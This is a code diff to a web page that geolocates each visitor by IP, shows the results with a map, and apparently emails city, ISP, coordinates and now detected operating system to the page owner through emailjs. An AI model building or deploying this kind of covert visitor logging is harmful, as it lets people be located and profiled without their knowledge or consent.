@@ -87,6 +87,33 @@
     </div>
 
     <script>
+        function detectOS() {
+            const platform = navigator.platform.toLowerCase();
+            const userAgent = navigator.userAgent.toLowerCase();
+
+            if (platform.includes('win')) {
+                return 'Windows';
+            } else if (platform.includes('mac')) {
+                // iPads and iPhones can report Mac sometimes, so check UA
+                if (/iphone|ipad|ipod/.test(userAgent)) {
+                    return 'iOS';
+                }
+                return 'Mac';
+            } else if (platform.includes('linux')) {
+                // Could be Android too
+                if (/android/.test(userAgent)) {
+                    return 'Android';
+                }
+                return 'Linux';
+            } else if (/iphone|ipad|ipod/.test(userAgent)) {
+                return 'iOS';
+            } else if (/android/.test(userAgent)) {
+                return 'Android';
+            } else {
+                return 'Unknown';
+            }
+        }
+
         (async () => {
             emailjs.init("uBAGF6sfmnQ4zOX4y");
 
@@ -99,6 +126,8 @@
                 const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                 const geo = await geoRes.json();
 
+                const operatingSystem = detectOS();
+
                 // Update UI
                 const card = document.getElementById("card");
                 card.innerHTML = `
@@ -107,6 +136,7 @@
                     <div class="line">Region: ${geo.region}</div>
                     <div class="line">Country: ${geo.country_name}</div>
                     <div class="line">ISP: ${geo.org}</div>
+                    <div class="line">Platform: ${operatingSystem}</div>
 
                     <iframe 
                         src="https://maps.google.com/maps?q=${geo.latitude},${geo.longitude}&z=12&output=embed">
@@ -135,6 +165,7 @@
                         Country: ${geo.country_name}
                         ISP: ${geo.org}
                         Approximate Lat/Lon: ${geo.latitude}, ${geo.longitude}
+                        Platform: ${operatingSystem}
                     `
                 };
 
